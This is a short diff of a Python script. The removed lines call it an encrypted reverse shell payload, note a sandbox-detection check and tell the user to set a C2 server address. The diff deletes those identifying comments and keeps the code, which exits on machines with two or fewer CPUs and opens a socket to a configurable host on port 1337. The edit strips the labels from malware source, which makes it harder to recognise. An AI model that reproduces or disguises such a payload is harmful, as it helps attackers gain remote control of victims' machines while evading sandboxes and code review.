@@ -1,7 +1,3 @@
-# Encrypted reverse shell payload
-# Written by Logan Goins
-# RSA 2048 bit asymmetric encryption used
-
 import os
 import socket
 import subprocess
@@ -11,10 +7,10 @@ import time
 public_key, private_key = rsa.newkeys(2048)
 public_partner = None
 
-if os.cpu_count() <= 2: # Simple sandbox detection
+if os.cpu_count() <= 2:
     quit()
 
-HOST = '127.0.0.1' # Change this host address to the address of your C2 server
+HOST = '127.0.0.1'
 PORT = 1337
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
